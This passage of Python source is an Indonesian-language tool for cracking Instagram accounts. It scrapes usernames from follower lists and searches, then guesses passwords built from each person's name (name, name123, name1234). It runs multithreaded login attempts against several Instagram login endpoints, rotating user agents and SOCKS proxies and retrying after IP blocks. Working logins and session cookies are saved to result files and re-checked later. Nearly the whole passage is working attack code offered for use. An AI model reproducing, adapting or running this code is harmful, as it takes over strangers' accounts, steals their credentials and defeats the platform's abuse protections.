						x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/following/?count=200&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
						x_jason=json.loads(x.text)
						try:
							for i in x_jason['users']:
								username = i["username"]
								nama = i["full_name"]
								internal.append(f'{username}|{nama}')
								following.append(username)
							wr = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
							sys.stdout.write(f"\r{P}[{B}*{P}] sedang mengumpulkan {wr}{len(internal)} {P}id...")
							sys.stdout.flush()
							time.sleep(0.0002)
							try:
								maxid=x_jason['next_max_id']
							except:
								break
						except:
							if 'challenge' in x.text:
								break
							else:
								continue
				print("\r")
			except Exception as e:
				print(f'{P}[{M}!{P}] username tidak tersedia')
			return internal
		else:lisensi()

	def ingfoocu(self, cookie):
		with requests.Session() as ses:
		     try:
		         link = ses.get(f"https://i.instagram.com/api/v1/accounts/edit/web_form_data/", headers={"user-agent":USN},cookies={"cookie":cookie}).json()["form_data"]
		         nomor = link["phone_number"].replace("-", "").replace(" ", "")
		         tggl = link["birthday"]
		         year, month, day = tggl.split("-")
		         month = bulan_ttl[month]
		         tanggal = (f"{day} {month} {year}")
		     except:
		         nomor = "-"
		         tanggal = "-"
		     return nomor, tanggal
	
	def AdityaCreate(self, cookie):
		with requests.Session() as ses:
		     try:
		         b = ses.get("https://www.instagram.com/accounts/access_tool/", cookies={"cookie":cookie})
		         soup = parser(b.text,'html.parser')
		         body = soup.find("body")
		         script = body.find("script", text=lambda t: t.startswith("window._sharedData"))
		         script_json = script.string.split(" = ", 1)[1].rstrip(";")
		         script_json = json.loads(script_json)
		         i = script_json["entry_data"]['SettingsPages']
		         regax = re.findall('\d+',str(i))
		         tahun = datetime.fromtimestamp(int(regax[0])).strftime('%d %B %Y')
		     except:
		         tahun = "-"
		     return tahun
	
	def ingfo(self):
		urut = []
		prints(Panel(f"{P2}[ {H2}hasil crack akan di simpan di dalam folder results {P2}]",width=90,padding=(0,11),style=f"bold cyan"))
		urut.append(Panel(f"{P2}result {H2}OK-{day}.txt",width=39,padding=(0,5),style=f"bold cyan"))
		urut.append(Panel(f"{P2}result {K2}CP-{day}.txt[/]",width=39,padding=(0,5),style=f"bold cyan"))
		self.tol.print(Columns(urut))
		prints(Panel(f"{H2}craking sedang di mulai, ketik ctrl+z di keyboard anda untuk berhenti\n\n{N2}    hidupkan mode pesawat 5 detik jika terdeteksi adanya spam ip",width=90,padding=(0,3),style=f"bold cyan"))

	def methodku(self):
		urut = []
		urut.append(Panel(f"API {H2}recommended{P2}",title=f"{R2}01{P2}",width=25,padding=(0,4),style=f"bold cyan"))
		urut.append(Panel(f"AJAX {H2}very slow{P2}",title=f"{R2}02{P2}",width=25,padding=(0,4),style=f"bold cyan"))
		urut.append(Panel(f"API V2 {H2}fast",title=f"{R2}03{P2}",width=27,padding=(0,6),style=f"bold cyan"))
		self.tol.print(Columns(urut))

	def passwordAPI(self,xnx):
		prints(Panel(f"{P2}total username terkumpul : {R2}{len(internal)}",width=90,padding=(0,20),style=f"bold cyan"))
		self.methodku()
		u = input(f'{P}[{B}?{P}] pilih method : {H}')
		if u in [""]:
		    method.append('satu')
		elif u in ["1","01"]:
		    method.append('satu')
		elif u in ["2","02"]:
		    method.append('dua')
		elif u in ["3","03"]:
		    method.append('tiga')
		else:
			method.append('satu')
		prints(Panel(f"{P2}[{R2}01{P2}]. nama, nama123, nama1234\n{P2}[{R2}02{P2}]. nama, nama123, nama1234, nama12345\n{P2}[{R2}03{P2}]. nama, nama123, nama1234, nama12345, nama123456\n{P2}[{R2}04{P2}]. nama, nama123, nama1234, manual",title=f"{M2}• {K2}• {H2}•{P2} PASSWORD {H2}• {K2}• {M2}•",width=90,padding=(0,4),style=f"bold cyan"))
		c=input(f'{P}[{B}?{P}] pilih password : {H}')
		if c in ["1","01"]:
			self.generateAPI(xnx,c)
		elif c in ["2","02"]:
			self.generateAPI(xnx,c)
		elif c in ["3","03"]:
			self.generateAPI(xnx,c)
		elif c in ["4","04"]:
			prints(Panel(f"{P2}gunakan tanda koma ({R2},{P2}) untuk pemisahan contoh sayang, sayang123, kontol",width=90,padding=(0,3),style=f"bold cyan"))
			zx=input(f'{P}[{B}?{P}] masukan password : {H}')
			self.generateAPI(xnx,c,zx)
		else:
			self.passwordAPI(xnx)

	def generateAPI(self,user,o,zx=''):
		self.ingfo()
		with ThreadPoolExecutor(max_workers=15) as adtyaxc:
			for i in user:
				try:
					username=i.split("|")[0]
					password=i.split("|")[1].lower()
					for w in password.split(" "):
						if len(w)<3:
							continue
						else:
							w=w.lower()
							if o=="1":
								if len(w)==3 or len(w)==4 or len(w)==5:
									sandi=[w,w+'123',w+'1234']
								else:
									sandi=[w,w+'123',w+'1234']
							elif o=="2":
								if len(w)==3 or len(w)==4 or len(w)==5:
									sandi=[w,w+'123',w+'1234',password.lower()]
								else:
									sandi=[w+'123',w,w+'1234',password.lower()]
							elif o=="3":
								if len(w)==3 or len(w)==4 or len(w)==5:
									sandi=[w,w+'123',w+'1234',w+'321',w+'12345',w+'123456',password.lower()]
								else:
									sandi=[w,w+'123',w+'1234',w+'321',w+'12345',w+'123456',password.lower()]
							elif o=="4":
								if len(w)==3 or len(w)==4 or len(w)==5:
									sandi = zx.replace(" ", "").split(",")
								else:
									sandi = zx.replace(" ", "").split(",")
							if 'satu' in method:
								adtyaxc.submit(self.crackAPI,username,sandi)			
							elif 'dua' in method:
								adtyaxc.submit(self.crackAJAX,username,sandi)
							elif 'tiga' in method:
							    adtyaxc.submit(self.crackAPIversi2,username,sandi)
							else:
								adtyaxc.submit(self.crackAPI,username,sandi)
				except:
					pass
		print('\n')
		prints(Panel(f" {P2}Hasil {R2}{len(internal)} {P2}username selesai hasil Ok : {H2}{len(success)}{P2} Hasil Cp : {K2}{len(checkpoint)}{P2} ",width=90,padding=(0,8),style=f"bold cyan"))
		exit()

	def APIinfo(self,user):
		try:
			x=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
			x_jason=x.json()["data"]["user"]
			nama=x_jason["full_name"]
			pengikut=x_jason["edge_followed_by"]["count"]
			mengikut=x_jason["edge_follow"]["count"]
			postingan=x_jason["edge_owner_to_timeline_media"]["count"]
		except:
			nama = "-"
			pengikut = "-"
			mengikut = "-"
			postingan = "-"
		return nama,pengikut,mengikut,postingan
	
	def crackAPI(self,user,pas):
		global loop,success,checkpoint
		ses = requests.Session()
		logtemp=0
		guid = str(uuid.uuid4())
		ponid = str(uuid.uuid4())
		andro = "android-%s" % hashlib.md5(str(time.time()).encode()).hexdigest()[:16]
		ig_sig = HARIS["ig_sig"]
		verig = HARIS["IGV"]
		igver = verig.split(",")
		igv = random.choice(igver)
		gedz = HARIS1["AOREC"][random.randrange(0,277)]["aorec"]
		ven1 = gedz.split('|')[1]
		ven2 = gedz.split('|')[2]
		giu1 = HARIS["giu"]
		giu = giu1.split("||")
		ua = f'{giu[0]} {igv} {giu[1]} {ven1}; {ven2}; {giu[2]}'
		dat = HARIS["sinkz"]
		dat.update({"id": guid})
		data1 = json.dumps(dat)
		ned = hmac.new(ig_sig.encode('utf-8'), str(data1).encode('utf=8'),hashlib.sha256).hexdigest()
		data2 = HARIS["sinkz1"]
		data2.update({'signed_body': f'{ned}.{str(data1)}'})
		head = HARIS["headaing"]
		head.update({"user-agent": ua})
		while True:
				try:
					p = ses.post(HARIS["sinkz2"],headers=head,data=data2)
					break
				except:pass
		sys.stdout.write(f'\r{P}[{H}#{P}] crack {H}stabil {P}{loop}/{len(internal)}{P} OK-:{H}{len(success)} {N}CP-:{K}{len(checkpoint)} {P}');sys.stdout.flush()
		for pw in pas:
				try:
					data = json.dumps({"phone_id":ponid,"_csrftoken": ses.cookies["csrftoken"],"username":user,"guid":guid,"device_id":andro,"password": pw,"login_attempt_count": str(logtemp)})
					ned = hmac.new(ig_sig.encode('utf-8'), str(data).encode('utf=8'),hashlib.sha256).hexdigest()
					head2 = HARIS["headaing1"]
					head2.update({"user-agent": ua})
					pasw = pw.replace(' ','+')
					sianjing = HARIS["sianjing"]
					setan = sianjing.split("||")
					dataa = f'{setan[0]}{ned}{setan[1]}{ponid}{setan[2]}{ses.cookies["csrftoken"]}{setan[3]}{user}{setan[4]}{guid}{setan[5]}{andro}{setan[6]}{pw}{setan[7]}{logtemp}{setan[8]}'
					respon = ses.post(HARIS["crack"],headers=head2,data=dataa)
					try:
						xyaaXD = json.loads(respon.text)
					except:
						xyaaXD = (respon.text)
					logtemp+=1
					if "logged_in_user" in str(xyaaXD) or "sessionid" in ses.cookies.get_dict():
						success.append(user)
						try:
							nama,pengikut,mengikut,postingan=self.APIinfo(user)
							print("\r                                       ")
							adit=f'\rNama      : {nama}\nUsername  : {user}\nPassword  : {pw}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-Agent: {user_agentAPI()}'
							pepekXD = nel(adit, style='green')
							print('\n')
							cetak(nel(pepekXD,style='',title='\r[green]Account Login Method API[white]'))
							open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
							open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{respon.text}\n')
							break
						except:
							print("\r                                       ")
							adit=f'\rNama      : null\nUsername  : null\nPassword  : null\nPengikut  : null\nMengikuti : null\nPostingan : null\nUser-Agent: {user_agentAPI()}'
							pepekXD = nel(adit, style='green')
							print('\n')
							cetak(nel(pepekXD,style='',title='\r[green]Account Login Method API[white]'))
							open(f"result/success-{day}.txt","a").write(f'null|null\n')
							open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{respon.text}\n')
							break
					elif 'https://i.instagram.com/challenge' in str(respon.text):
						nama,pengikut,mengikut,postingan=self.APIinfo(user)
						print("\r                                       ")
						adit=f'\rNama      : {nama}\nUsername  : {user}\nPassword  : {pw}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-agent: {user_agentAPI()}'
						pepekXD = nel(adit, style='yellow')
						print('\n')
						cetak(nel(pepekXD,style='', title='\r[yellow]Account Check Method API[white]'))
						open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
						checkpoint.append(user)
						open('.logCrack','a').write(f'{K}╭({K}{loop}{K}) {K}{user} {K}|| {K}{pw}\n{K}╰{K}{respon.text}\n')
						break
					elif 'ip_block' in str(respon.text) or 'spam' in str(respon.text):
						sys.stdout.write(f'\r{P}[{M}#{P}] crack {M}spamIP {P}{loop}/{len(internal)}{P} OK-:{H}{len(success)} {N}CP-:{K}{len(checkpoint)} {P}');sys.stdout.flush()
						time.sleep(1)
						open('.logCrack','a').write(f'{M}╭({loop}) {user} || {pw}\n╰{respon.text}\n{N}\n')
						self.crackAPI(user,pas)
						loop-=1
						break
				except requests.exceptions.ConnectionError:
					time.sleep(5)
					self.crackAPI(user,pas)
					loop-=1
					break
				except Exception as e:
					pass
					open('.logCrack','a').write(f'{N}╭({loop}) {user} || {pw}\n╰{respon.text}\n{N}\n')
		loop+=1
					
				
	def crackAPIversi2(self,user,pas):
		global loop,success,checkpoint
		ses = requests.Session()
		ua = random.choice(baru)
		sys.stdout.write(f'\r{P}[{H}VINDRA-XD{P}] crack {H}stabil {P}{loop}/{len(internal)}{P} OK-:{H}{len(success)} {N}CP-:{K}{len(checkpoint)} {P}');sys.stdout.flush()
		try:
			for pw in pas:
				xxcteam = random.randint(1000000000, 99999999999)
				jam = calendar.timegm(current_GMT)
				proxy = {'http': 'socks5://'+random.choice(prox)}
				p = ses.get('https://z-p15.www.instagram.com/accounts/login/?force_classic_login&hl=en')
				head = {
				       "Host": "z-p15.www.instagram.com",
				       "Connection": "keep-alive",
				       "Content-Length": "320",
				       "X-IG-WWW-Claim": "0",
				       "X-Instagram-AJAX": "9080db6b6a51",
				       "Content-Type": "application/x-www-form-urlencoded",
				       "Accept": "*/*",
				       "X-Requested-With": "XMLHttpRequest",
				       "X-ASBD-ID": "198387",
				       "User-Agent": ua,
				       "X-CSRFToken": p.cookies['csrftoken'],
				       "X-IG-App-ID": "1217981644879628",
				       "Origin": "https://z-p15.www.instagram.com",
				       "Sec-Fetch-Site": "same-origin",
				       "Sec-Fetch-Mode": "cors",
				       "Sec-Fetch-Dest": "empty",
				       "Referer": "https://z-p15.www.instagram.com/accounts/login/",
				       "Accept-Encoding": "gzip, deflate",
				       "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				       }
				data = {
				      "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{jam}:{pw}",
				      "username":user,
				      "queryParams":"{}",
				      "optIntoOneTap":"false",
				      "stopDeletionNonce":"",
				      "trustedDeviceRecords":"{}"
				      }
				respon=ses.post("https://z-p15.www.instagram.com/accounts/login/ajax/", headers = head, data = data, proxies = proxy, allow_redirects = False)
				xc_team=json.loads(respon.text)
				if "userId" in str(xc_team) or "sessionid" in ses.cookies.get_dict():
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print("\r                                       ")
					adit=f'\rNama      : {nama}\nUsername  : {user}\nPassword  : {pw}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-Agent: {uazku()}'
					pepekXD = nel(adit, style='green')
					print('\n')
					cetak(nel(pepekXD,style='',title='\r[green]Account Login Method API V2[white]'))
					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					success.append(user)
					break
				elif 'href="https://www.instagram.com/challenge/action/"' in str(xc_team):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print("\r                                       ")
					adit=f'\rNama      : {nama}\nUsername  : {user}\nPassword  : {pw}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-agent: {uazku()}'
					pepekXD = nel(adit, style='yellow')
					print('\n')
					cetak(nel(pepekXD,style='', title='\r[yellow]Account Check Method API V2[white]'))
					open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					checkpoint.append(user)
					break
				elif 'ip_block' in str(respon.text):
					sys.stdout.write(f'\r{P}[{M}#{P}] crack {M}spamIP {P}{loop}/{len(internal)}{P} OK-:{H}{len(success)} {N}CP-:{K}{len(checkpoint)} {P}');sys.stdout.flush()
					time.sleep(10)
					self.crackAPIversi2(user,pas)
				else:
					continue
			loop+=1
		except:
			self.crackAPIversi2(user,pas)
	
	def crackAJAX(self,user,pas):
		global loop,success,checkpoint
		ses = requests.Session()
		uas = random.choice(UaNgentodMuach)
		sys.stdout.write(f'\r{P}[{H}VINDRA-XD{P}] crack {H}stabil {P}{loop}/{len(internal)}{P} OK-:{H}{len(success)} {N}CP-:{K}{len(checkpoint)} {P}');sys.stdout.flush()
		try:
			for pw in pas:
				xxcteam = random.randint(1000000000, 99999999999)
				jam = calendar.timegm(current_GMT)
				p = ses.get(str(random.choice([
				      "https://www.secure.instagram.com/accounts/login/",
				      "https://www.secure.instagram.com/accounts/login/?force_classic_login=&",
				      "https://www.secure.instagram.com/accounts/login/?force_classic_login&hl=en",
				      "https://www.secure.instagram.com/accounts/onetap/",
				      "https://www.secure.instagram.com/accounts/onetap/?next=%2F",
				      "https://www.secure.instagram.com/accounts/onetap/?next=/"
				      ])))
				head = {
				      "Host": "www.secure.instagram.com",
				      "Connection": "keep-alive",
				      "Content-Length": "318",
				      "X-IG-WWW-Claim": "0",
				      "X-Instagram-AJAX": "9080db6b6a51",
				      "Content-Type": "application/x-www-form-urlencoded",
				      "Accept": "*/*",
				      "X-Requested-With": "XMLHttpRequest",
				      "X-ASBD-ID": "198387",
				      "User-Agent": uas,
				      "X-CSRFToken": p.cookies['csrftoken'],
				      "X-IG-App-ID": "1217981644879628",
				      "Origin": "https://www.secure.instagram.com",
				      "Sec-Fetch-Site": "same-origin",
				      "Sec-Fetch-Mode": "cors",
				      "Sec-Fetch-Dest": "empty",
				      "Referer": "https://www.secure.instagram.com/accounts/login/",
				      "Accept-Encoding": "gzip, deflate",
				      "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				      }
				head2 = {
				      "Host": "www.secure.instagram.com",
				      "Connection": "keep-alive",
				      "Upgrade-Insecure-Requests": "1",
				      "User-Agent": uas,
				      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				      "dnt": "1",
				      "X-Requested-With": "mark.via.gp",
				      "Sec-Fetch-Site": "none",
				      "Sec-Fetch-Mode": "navigate",
				      "Sec-Fetch-User": "?1",
				      "Sec-Fetch-Dest": "document",
				      "Referer": "https://www.secure.instagram.com/accounts/login/",
				      "Accept-Encoding": "gzip, deflate",
				      "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				      }
				param = {
				      "Host": "www.secure.instagram.com",
				      "Connection": "keep-alive",
				      "Cache-Control": "max-age=0",
				      "Upgrade-Insecure-Requests": "1",
				      "User-Agent": uas,
				      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				      "X-Requested-With": "mark.via.gp",
				      "Sec-Fetch-Site": "none",
				      "Sec-Fetch-Mode": "navigate",
				      "Sec-Fetch-User": "?1",
				      "Sec-Fetch-Dest": "document",
				      "Referer": f"https://www.secure.instagram.com/"+user+"/",
				      "Accept-Encoding": "gzip, deflate",
				      "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				      }
				data = {
				      "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{jam}:{pw}",
				      "username":user,
				      "queryParams":"{}",
				      "optIntoOneTap":"false",
				      "stopDeletionNonce":"",
				      "trustedDeviceRecords":"{}"
				      }
				dateku = str(random.choice([param, head2]))
				respon=ses.post("https://www.secure.instagram.com/accounts/login/ajax/",headers = head, data = data, allow_redirects = dateku)
				xc_team=json.loads(respon.text)
				if "userId" in str(xc_team) or "sessionid" in ses.cookies.get_dict():
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					coki = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
					print("\r                                       ")
					adit=f'\rNama      : {nama}\nUsername  : {user}\nPassword  : {pw}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-Agent: {uazku()}\ncookies   : {coki}'
					pepekXD = nel(adit, style='green')
					print('\n')
					cetak(nel(pepekXD,style='',title='\r[green]Account Login Method AJAX[white]'))
					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					success.append(user)
					break
				elif 'href="https://www.instagram.com/challenge/action/"' in str(xc_team):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print("\r                                       ")
					adit=f'\rNama      : {nama}\nUsername  : {user}\nPassword  : {pw}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-agent: {uazku()}'
					pepekXD = nel(adit, style='yellow')
					print('\n')
					cetak(nel(pepekXD,style='', title='\r[yellow]Account Check Method AJAX[white]'))
					open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					checkpoint.append(user)
					break
				elif 'ip_block' in str(respon.text):
					sys.stdout.write(f'\r{P}[{M}#{P}] crack {M}spamIP {P}{loop}/{len(internal)}{P} OK-:{H}{len(success)} {N}CP-:{K}{len(checkpoint)} {P}');sys.stdout.flush()
					time.sleep(10)
					self.crackAJAX(user,pas)

				else:
					continue
			loop+=1
		except:
			self.crackAJAX(user,pas)
	
	def checkAPI(self,usr,pwd):
		try:
			ts = calendar.timegm(current_GMT)
			xyaaXD = random.randint(1000000000, 99999999999)
			ses = requests.Session()
			ts = calendar.timegm(current_GMT)
			sys.stdout.write(f'\r{P}[{H}#{P}] {H}cheking {N}{usr}{P}');sys.stdout.flush()
			response = ses.get(f"https://z-p42.www.instagram.com/accounts/login/?force_classic_login&hl=en").text
			token = re.search('name="csrfmiddlewaretoken" value="(\\w+)"/>', str(response)).group(1)
			head = {
                    'Host': 'z-p42.www.instagram.com',
                    'Connection': 'keep-alive',
                    'Content-Length': '296',
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': '1',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX2185 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36',
                    'Origin': 'https://z-p42.www.instagram.com',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'dnt': '1',
                    'X-Requested-With': 'mark.via.gp',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-User': '?1',
                    'Sec-Fetch-Dest': 'document',
                    'Referer': 'https://z-p42.www.instagram.com/accounts/login/?force_classic_login&hl=en',
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
                    }
			param={
					'csrfmiddlewaretoken': token,
					'username': usr,
					'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{ts}:{pwd}'
					}
			respon=ses.post("https://z-p42.www.instagram.com/accounts/login/?force_classic_login&hl=en", headers = head, data = param, allow_redirects=True)
			if "userId" in str(respon.text) or "sessionid" in ses.cookies.get_dict():
				nama,pengikut,mengikut,postingan=self.APIinfo(usr)
				print("OK")
				print(f"{H}{usr} {P}| {H}{pwd}{P}\n")
				open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
			elif 'href="https://www.instagram.com/challenge/action/"' in str(respon.text):
				nama,pengikut,mengikut,postingan=self.APIinfo(usr)
				print("CP")
				print(f"{K}{usr} {P}| {K}{pwd}{P}\n")
				open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
			elif 'ip_block' in str(respon.text):
				sys.stdout.write(f'\r {P}[{M}#{P}] {M}spamIP {N}{len(usr)}{P}');sys.stdout.flush()
				time.sleep(5)
				self.checkAPI(usr, pwd)
		except:
			self.checkAPI(usr,pwd)

	def menu(self):
		self.logo()
		c=input(f'{P}[{B}?{P}] menu : {H}')
		if c=='':
			self.menu()
		
		elif c in ('1','01'):
			m=int(input(f'{P}[{B}?{P}] masukan jumlah target : {H}'))
			prints(Panel(f"{P2}masukan nama random untuk di searching, {H2}1 {P2}nama setara dengan {H2}5000 {P2}username",width=90,padding=(0,1),style=f"bold cyan"))
			for i in range(m):
				i+1
				i+=1
				nama=input(f'{P}[{B}?{P}] masukan nama {B}{len(internal)}{P} : {H}')
				name=self.searchAPI(self.cookie,nama)
			self.passwordAPI(name)
			
		elif c in ('2','02'):
			mas=input(f"{P}[{B}?{P}] apakah anda ingin crack massal? Y/t : {H}")
			if mas in ['y','Y']:
				masal(self)
			elif mas in ['t','T']:
				massal(self)
			elif mas in ['']:
				print(f"{P}[{B}?{P}] jangan kosong!")
				exit()

		elif c in ('3','03'):
			mas=input(f"{P}[{B}?{P}] apakah anda ingin crack massal? Y/t : {H}")
			if mas in ['y','Y']:
				mengi(self)
			elif mas in ['t','T']:
				meng(self)
			elif mas in ['']:
				print(f"{P}[{B}?{P}] jangan kosong!")
				exit()


		elif c in ('4','04'):
			prints(Panel(f"{P2}tunggu sebentar sedang mengecek file hasil result anda",width=90,padding=(0,9),style=f"bold cyan"))
			time.sleep(4)
			for i in os.listdir('result'):
				print(f'{P}[{B}+{P}] {i}')
			c=input(f'{P}[{B}?{P}] masukan nama file : {H}')
			g=open("result/%s"%(c)).read().splitlines()
			jalan(f'\n{P}[{B}?{P}] total result di temukan : {H}{len(g)}{P}')
			prints(Panel(f"{P2}sedang mengecek status akun harap tunggu sebentar",width=90,padding=(0,12),style=f"bold cyan"))
			for s in g:
				usr=s.split("|")[0]
				pwd=s.split("|")[1]
				self.checkAPI(usr,pwd)
			jalan(f"{P}[{H}✓{P}] proses check akun selesai...")
			exit()

		elif c in ('5','05'):
			prints(Panel(f"{P2}tunggu sebentar sedang mengecek file hasil result anda",width=90,padding=(0,9),style=f"bold cyan"))
			time.sleep(4)
			for i in os.listdir('result'):
				print(f'{P}[{B}+{P}] {i}')
			c=input(f'{P}[{B}?{P}] masukan nama file : {H}')
			g=open("result/%s"%(c)).read().splitlines()
			xx=c.split("-")
			xc=xx[0]
			jalan(f'\n{P}[{B}?{P}] total result di temukan : {H}{len(g)}{P}')
			for s in g:
				usr=s.split("|")[0]
				pwd=s.split("|")[1]
				fol=s.split("|")[2]
				ful=s.split("|")[3]
				if xc=="checkpoint":
					print(f"""
{P}[{K}+{P}] {K}CHECK{P}
 {P}|{P}
 {P}├╴>{P} username  : {K}{usr}{C}
 {P}├╴>{P} password  : {K}{pwd}{C}
 {P}├╴>{P} followers : {K}{fol}{C}
 {P}├╴>{P} following : {K}{ful}{C}
					""");sleep(0.05)
				else:
					print(f"""
{P}[{H}+{P}] {H}LIVE{P}
 {P}|{P}
 {P}├╴>{P} username  : {H}{usr}{C}
 {P}├╴>{P} password  : {H}{pwd}{C}
 {P}├╴>{P} followers : {H}{fol}{C}
 {P}├╴>{P} following : {H}{ful}{C}
					""");sleep(0.05)
		
		elif c in ('6','06'):
			print(f'{P}[{M}!{P}] bot auto unfollow sedang dalam proses maintenance')
			time.sleep(2)
			self.menu()

		elif c in ('7','07'):
			self.HapusLisen()
			
		elif c in ('0','00'):
			self.Exit()

		else:
			self.menu()
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	jalan(f"\n {P} Hi, I'm Xyzon Dev, I'm Writer of This Script, use this script well, don't abuse it :>{x} ")
	login()
